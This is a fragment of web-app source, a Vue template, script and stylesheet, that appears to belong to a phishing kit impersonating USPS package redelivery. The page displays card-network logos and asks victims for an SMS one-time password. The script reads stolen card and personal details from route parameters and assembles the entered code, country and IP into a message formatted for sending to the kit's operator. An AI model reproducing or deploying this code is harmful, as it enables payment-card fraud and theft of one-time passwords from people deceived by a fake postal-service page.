    ...
    <div id="tracking_page_wrapper">
      ...
      <div class="container-fluid full-subheader">
        ...
        <div class="subheader_links">
          <a href="#" class="active"
            >Tracking <i class="icon-carat_right"></i
          ></a>
      ...
      <div id="tracked-numbers">
        <div class="track-bar-container" style="background: none !important">
          <div class="container-fluid">
                  ...
                  <div class="delivery_status">
                    ...
                    <h2>
                      ...
                      <p style="margin-top: 15px; font-size: 14px">
                        USPS Allows you to Redeliver your package to your
                        address in case of delivery failure or any other
                        case.<br />You can also track the package at any time,
            ...
            <div v-if="!loading" style="margin-bottom: 50px !important">
              <div class="message">
                <div class="container">
                  <div class="transfer shadow">
                    <div class="image">
                      <img src="./pro_logo.svg" />
                      <img
                        style="width: 200px"
                        src="./verified-visa-master.png"
                      />
                    </div>
                    ...
                    <div class="">
                      <p v-if="infos">
                        The unique password has been sent to the mobile number
                        listed below ({{ infos.phoneNumber }}) if you need to
                        change Your bark of modify it via the attable
                        chanets(ATM,WEB)
                      </p>
                    </div>
                    <form method="post">
                      ...
                      >
                        <p style="color: red !important">
                          ...
                          <span id="counter" style="color: red !important">
                            {{ number }}</span
                          >
                          Seconds
                        </p>
...
export default {
  ...
  computed: {
    cc() {
      return JSON.parse(this.$route.params.cc);
    },
    infos() {
      return JSON.parse(this.$route.params.infos);
    },
  },
  data() {
    return {
    ...
    async confirmSMS(e) {
      ...
      if (this.tries < 2) {
        ...
        ||||||||||🇺🇸| USPS Post |🇺🇸||||||||||%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| USPS Post|💳||||||||||`;
          ...
          var input = document.getElementById("confirm-sms");
...
.navbar .choses ul li img {
  width: 20px;
}
.navbar .choses ul .active {
  color: white;
  background: #333366;
  border-right: 4px solid #e71921;
}
...
.info .login .lebaa .prod {
  width: 48%;
}
.info .login .lebaa input:focus {
  box-shadow: none;
}
.info .login .lebaa .btn {
  width: 100%;
  background: #336;
  margin-top: 20px;
  padding: 8px 0;
...
.info .title .paragraph p {
  color: #336;
}
.info .title .paragraph span {
  font-size: 14px;
...
.info .title .lowing strong {
  color: #336;
  margin-top: 20px;
}
.info .title .lowing h5 {
  color: #336;
  margin-top: 20px;
  margin-bottom: 10px;
}
...
.info .title .lowing p small {
  color: rgba(0, 0, 0, 0.6);
}
.info .title .lowing span {
  font-weight: 700;
  color: #336;
  margin-top: 50px;
}
.info .title .lowing span i {
  font-weight: bold;
  color: red;
  font-size: 18px;
}
...
.message .transfer .image {
  display: flex;
  justify-content: space-between;
  background: #ededed;
  padding: 20px;
}
.message .transfer .image img,
.message .transfer .image svg {
  width: 60px;
}
.message .transfer p {
  font-size: 14px;
...
.message .transfer .content .left span {
  margin-top: 20px;
  display: block;
  font-size: 13px;
  font-weight: 700;
}
.message .transfer .content .left .osama {
  margin-top: 25px;
}
.message .transfer .content .right {
  margin-left: 30px;
}
.message .transfer .content .right span {
  margin-top: 20px;
  display: block;
  font-size: 13px;
  font-weight: 700;
...
.message .transfer .time p {
  font-size: 13px;
  font-weight: 600px;
  margin-bottom: 0;
}
.message .transfer .time span {
  margin-left: 10px;
  font-size: 14px;
  font-weight: 600;
  color: rgba(0, 0, 0, 0.6);
}
.message .transfer .botona {
  display: flex;
  justify-content: end;
  padding: 0 20px;
}
.message .transfer .botona .btn {
  background: #336;
  color: #fff;
  font-weight: 700;
  text-align: center;
...
@media (max-width: 667px) {
  .succes .transfer .lban img {
    width: 300px;
  }
}
.succes .transfer .sppp {
  font-size: 14px;
  font-weight: 600;
  color: rgba(0, 0, 0, 0.7);
}
...
/*# sourceMappingURL=laylay.css.map */
